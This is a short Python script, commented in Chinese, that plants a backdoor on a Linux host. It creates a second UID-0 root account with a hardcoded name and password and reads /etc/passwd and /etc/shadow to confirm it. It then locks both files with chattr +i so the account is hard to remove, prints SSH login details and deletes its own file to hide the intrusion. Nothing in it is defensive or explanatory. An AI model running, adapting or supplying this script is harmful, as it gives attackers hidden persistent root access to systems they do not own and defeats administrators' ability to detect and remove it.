# coding=utf-8
from __future__ import print_function
import subprocess
import sys, os


def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def adduser(user, password):
    command = "useradd -p $(openssl passwd -1 -salt 'salt' " + password + ") " + user + " -o -u 0 -g root -G root -s /bin/bash  -d /root"
    ml(command)
    command = "cat /etc/passwd"
    j = ml(command)
    command = "cat /etc/shadow"
    j2 = ml(command)
    if user in j and user in j2:
        print("----------------------->user：" + user + " password: " + password + "< -----------------------")
        print('ssh  ' + user + '@ip')
        ml('chattr +i /etc/passwd')
        ml('chattr +i /etc/shadow')
    else:
        print("----------------------->失败<-----------------------")


def deluser(user):
    try:
        ml('chattr -i /etc/passwd')
        ml('chattr -i /etc/shadow')
        command = "sed -i '/^" + user + ":/d' /etc/shadow"
        ml(command)
        command = "sed -i '/^" + user + ":/d' /etc/passwd"
        ml(command)
    except Exception as e:
        pass


def delete_current_script():
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print("当前脚本文件已成功删除" + script_path)
    except Exception as e:
        print("无法删除当前脚本文件：", e)


if __name__ == '__main__':
    user = 'passw123'
    password = 'admin@#45123'
    deluser(user)  # 删除用户
    adduser(user, password)
    delete_current_script()  # 删除当前执行脚本文件
